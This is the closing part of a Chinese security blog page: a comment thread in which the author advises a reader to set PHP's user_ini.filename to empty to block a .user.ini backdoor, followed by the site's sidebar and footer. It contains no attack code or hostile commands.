                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@呵呵：这个里面说的很详细：http://wooyun.org/bugs/wooyun-2014-071540，你可以看看。</p>
                    <span class="comment-time">时间: 2014-12-29 13:40</span>
                    <span class="comment-reply"><a href="#comment-1905" onclick="reply_to('1905','phithon')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1865">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">wskwsk</a></div>
                    <p>《user.ini文件构成的PHP后门》<br>请问一下 这个后门怎么防范呢？<br><br>;user_ini.filename = &quot;.user.ini&quot;，默认前面有分号，已经禁用了，测试后，发现仍能生效</p>
                    <span class="comment-time">时间: 2014-11-26 12:05</span>
                    <span class="comment-reply"><a href="#comment-1865" onclick="reply_to('1865','wskwsk')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1866">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@wskwsk：user_ini.filename =<br>设置成空即可，不要注释掉。</p>
                    <span class="comment-time">时间: 2014-11-26 12:12</span>
                    <span class="comment-reply"><a href="#comment-1866" onclick="reply_to('1866','phithon')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1862">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/8dc4fb4d032f76fe21716b9062797769.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.veryarm.com/" target="_blank" rel="nofollow noopener">arm</a></div>
                    <p>有研究就是好的</p>
                    <span class="comment-time">时间: 2014-11-24 09:31</span>
                    <span class="comment-reply"><a href="#comment-1862" onclick="reply_to('1862','arm')">回复</a></span>
                    </div>
                </div>
              </li>
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">添加新评论</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">网站</label>
                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">内容</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">验证码</label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="5d94b6b508fb8163bd6e2cea0db6aec1bb556ff4" />
</div><div class="col-6">
<img src="../captcha/image/5d94b6b508fb8163bd6e2cea0db6aec1bb556ff4/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">提交评论</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="337" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="Pb0o3Xg4BHiWnnT9g2U2q5MNVAOzSiRHBJofB2RNZ3wFVVHxi3RNnyPSgX5KrU3Z">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>搜索</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">最新评论</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>：<a href="../PENETRATION/javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>程序</cite>：<a href="../PENETRATION/discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>分类</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>随机标签</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
        
        <a rel="tag" href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
        
        <a rel="tag" href="../tag/iOS.html">iOS</a>
        
        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
        
        <a rel="tag" href="../tag/%E6%A1%A5%E6%8E%A5.html">桥接</a>
        
        <a rel="tag" href="../tag/writeup.html">writeup</a>
        
        <a rel="tag" href="../tag/IIS.html">IIS</a>
        
        <a rel="tag" href="../tag/WTForm.html">WTForm</a>
        
        <a rel="tag" href="../tag/apache.html">apache</a>
        
        <a rel="tag" href="../tag/web%E6%8C%87%E7%BA%B9.html">web指纹</a>
        
        <a rel="tag" href="../tag/%E6%B1%89%E8%AF%BA%E5%A1%94.html">汉诺塔</a>
        
        <a rel="tag" href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
        
        <a rel="tag" href="../tag/Linux.html">Linux</a>
        
        <a rel="tag" href="../tag/CSP.html">CSP</a>
        
        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
        
        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
        
        <a rel="tag" href="../tag/%E6%80%BB%E7%BB%93.html">总结</a>
        
        <a rel="tag" href="../tag/%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95.html">遍历目录</a>
        
        <a rel="tag" href="../tag/C-FREE.html">C-FREE</a>
        
        <a rel="tag" href="../tag/var_dump.html">var_dump</a>
        
        <a rel="tag" href="../tag/disable_functions.html">disable_functions</a>
        
        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">报纸</a>
        
        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
        
        <a rel="tag" href="../tag/web%E5%BA%94%E7%94%A8.html">web应用</a>
        
        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
        
        <a rel="tag" href="../tag/asyncore.html">asyncore</a>
        
        <a rel="tag" href="../tag/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87.html">沙盒绕过</a>
        
        <a rel="tag" href="../tag/fckeditor.html">fckeditor</a>
        
        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E5%BA%A6.html">数据库速度</a>
        
        <a rel="tag" href="../tag/kali.html">kali</a>
        
    </div>
  </div>

  <div class="widget widget-recent-entries">
	<h3 class="widget-title">热门日志</h3>
	<ul id="hotlog" class="widget-list">
    
    
        <li><a href="../other/tinger.html">About.Me</a></li>
    
        <li><a href="../PENETRATION/detect-django.html">如何判断目标站点是否为Django开发</a></li>
    
        <li><a href="../PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
    
        <li><a href="../PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
    
        <li><a href="../PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li>
    
    </ul>
  </div>
  

</div>
</div>

<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">
			<div class="col-6 columns">
			<h3>Little About</h3>
			<p>Phithon 非强迫症小青年  <br>
现居先 <br>
爱好：种花、买书、收藏明信片 <br>
欢迎各大组织收留 <br>
E-mail：root@leavesongs.com </p>
			</div>

			<div class="col-10 columns">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
        </div>
        <div class="bot-line"></div>
				<p class="copyright">
	Copyright &copy; Powered by talkbook
				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
                    <a href="../index.html">更换模板</a>
				</p>
			</div>
		</div>
	</div>
	<!-- /copyright -->
</div>
<a href="#" id="go-top">Top ↑</a>
<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
<script src="../static/deep/js/config.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function () {
    $(".entry a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $(".entry img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>

</body>

</html>